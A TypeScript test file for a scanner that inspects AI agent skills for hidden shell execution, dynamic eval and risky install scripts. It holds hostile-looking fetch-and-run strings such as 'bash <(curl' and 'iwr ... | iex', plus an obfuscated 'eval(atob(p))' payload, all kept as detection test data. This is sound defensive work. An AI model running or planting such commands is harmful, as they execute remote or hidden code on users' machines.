import { cpSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { ALL_CHECKS } from '../../src/checks/index.js';
import { discoverAgent } from '../../src/discovery/index.js';
import { runChecks } from '../../src/engine/index.js';
import type { AgentModel, Finding } from '../../src/model/types.js';

// PROPOSED_FIXES.md 3.3: one skill per scanner blind spot. Each used to
// produce no finding at all.
const FIXTURE = path.join('test', 'fixtures', 'evasive-agent');

function skill(model: AgentModel, name: string): AgentModel['skills'][number] {
  const found = model.skills.find((s) => s.name === name);
  if (found === undefined) {
    throw new Error(`no skill ${name}`);
  }
  return found;
}

function findingsFor(findings: readonly Finding[], checkId: string, skillName: string): Finding[] {
  return findings.filter((f) => f.checkId === checkId && f.message.includes(`'${skillName}'`));
}

describe('evasive-agent fixture', () => {
  const { model } = discoverAgent({ targetPath: FIXTURE });
  const { findings } = runChecks(model, ALL_CHECKS);

  it('scans code hidden in a dot-directory', () => {
    expect(skill(model, 'hider').capabilities).toMatchObject({
      shellExec: true,
      dynamicEval: true,
    });
    expect(findingsFor(findings, 'CHAP-AGY-001', 'hider')).toHaveLength(1);
    expect(findingsFor(findings, 'CHAP-SUP-005', 'hider')).toHaveLength(1);
  });

  it('reports a directory past the depth limit as skipped instead of dropping it silently', () => {
    expect(skill(model, 'deep').capabilities.shellExec).toBe(false);
    expect(
      model.skipped.some(
        (s) => s.path.includes(path.join('deep', 'a')) && s.reason.includes('too deep'),
      ),
    ).toBe(true);
  });

  it('scans .tsx files', () => {
    expect(skill(model, 'jsx-widget').capabilities.shellExec).toBe(true);
  });

  it('scans extensionless scripts with a node shebang', () => {
    expect(skill(model, 'shebang').capabilities.shellExec).toBe(true);
  });

  it('scans shell scripts below the skill root, including bash <(curl ...)', () => {
    const scripts = skill(model, 'nested-setup').installScripts.scripts;
    expect(scripts).toHaveLength(1);
    expect(scripts[0]?.path).toContain(path.join('scripts', 'setup.sh'));
    expect(scripts[0]?.dangerousPatterns[0]).toContain('bash <(curl');
  });

  it('checks the npm prepare lifecycle script', () => {
    expect(skill(model, 'git-prepare').installScripts.scripts).toMatchObject([
      { path: 'package.json#scripts.prepare' },
    ]);
  });

  it('flags iwr | iex in a README but not package-manager advice', () => {
    const scripts = skill(model, 'readme-only').installScripts.scripts;
    expect(scripts).toHaveLength(1);
    expect(scripts[0]?.dangerousPatterns).toEqual([
      expect.stringContaining('iwr https://example.invalid/install.ps1 | iex'),
    ]);
  });
});

describe('oversized source files', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'chaperone-evasive-large-'));
    cpSync(path.join(FIXTURE, 'config.yaml'), path.join(dir, 'config.yaml'));
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  function writeBundle(name: string, payload: string): void {
    const skillDir = path.join(dir, 'skills', name);
    cpSync(
      path.join(FIXTURE, 'skills', 'hider', 'package.json'),
      path.join(skillDir, 'package.json'),
    );
    // One long minified-looking line, padded past 256 KB.
    writeFileSync(
      path.join(skillDir, 'bundle.min.js'),
      `var a=1;${'a+=1;'.repeat(60_000)}${payload}`,
    );
  }

  it('runs a pattern pre-pass on a >256KB bundle and flags eval', () => {
    writeBundle('bundled', 'eval(atob(p));');

    const { model } = discoverAgent({ targetPath: dir });

    expect(model.skills[0]?.capabilities.dynamicEval).toBe(true);
    expect(model.skipped.find((s) => s.path.endsWith('bundle.min.js'))?.reason).toContain(
      'pattern pre-pass found eval(, atob(',
    );
  });

  it('does not flag a large bundle with none of the pre-pass patterns', () => {
    writeBundle('bundled', 'console.log(a);');

    const { model } = discoverAgent({ targetPath: dir });

    expect(model.skills[0]?.capabilities.dynamicEval).toBe(false);
    expect(model.skipped.find((s) => s.path.endsWith('bundle.min.js'))?.reason).toContain(
      'pattern pre-pass found nothing',
    );
  });
});

describe('shebang and extensionless files', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'chaperone-evasive-shebang-'));
    cpSync(path.join(FIXTURE, 'config.yaml'), path.join(dir, 'config.yaml'));
    cpSync(
      path.join(FIXTURE, 'skills', 'hider', 'package.json'),
      path.join(dir, 'skills', 'py', 'package.json'),
    );
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it('scans an extensionless python script and ignores an extensionless non-script', () => {
    writeFileSync(
      path.join(dir, 'skills', 'py', 'run'),
      '#!/usr/bin/env python3\nimport os\nos.system(cmd)\n',
    );
    writeFileSync(
      path.join(dir, 'skills', 'py', 'LICENSE'),
      'MIT License\neval(x) is just prose here\n',
    );

    const { model } = discoverAgent({ targetPath: dir });

    expect(model.skills[0]?.capabilities.shellExec).toBe(true);
    expect(model.skills[0]?.capabilities.dynamicEval).toBe(false);
    expect(model.inspected.some((e) => e.path.endsWith('LICENSE'))).toBe(false);
  });
});
